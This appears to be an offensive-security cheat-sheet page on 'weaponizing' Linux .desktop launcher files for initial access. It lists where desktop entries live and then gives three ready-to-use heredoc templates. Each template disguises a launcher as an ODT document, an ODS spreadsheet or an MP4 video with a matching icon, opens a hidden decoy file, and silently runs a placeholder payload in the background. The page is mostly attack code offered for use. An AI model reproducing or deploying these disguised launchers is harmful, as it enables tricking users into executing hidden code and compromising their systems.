---
author(s):
  - Userware
tags:
  - helpers
  - initial-access
  - weaponization
  - client-side-attacks
  - linux
---
# Desktop Files

## Common Files Locations

### Directory Entries

```
/usr/share/desktop-directories/
~/.local/share/desktop-directories/
```

### Desktop Entries

```
/usr/share/applications/
~/.local/share/applications/
```

## Libreoffice Files

```
/usr/share/applications/libreoffice-*.desktop
```

### Document Desktop File

```
$ cat > malicious_document.desktop << EOF
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=document.odt
Exec=libreoffice --writer $(pwd)/.real_document.odt; <payload> &
Terminal=false
Type=Application
Icon=libreoffice-writer
EOF
```

### Spreadsheet Desktop File

```
$ cat > malicious_document.desktop << EOF
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=document.ods
Exec=libreoffice --calc $(pwd)/.real_document.ods; <payload> &
Terminal=false
Type=Application
Icon=libreoffice-calc
EOF
```

## Video Desktop File

```
$ cat > malicious_video.desktop << EOF
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=video.mp4
Exec=/usr/bin/xdg-open $(pwd)/.real_video.mp4; <payload> &
Terminal=false
Type=Application
Icon=video-x-generic
EOF
```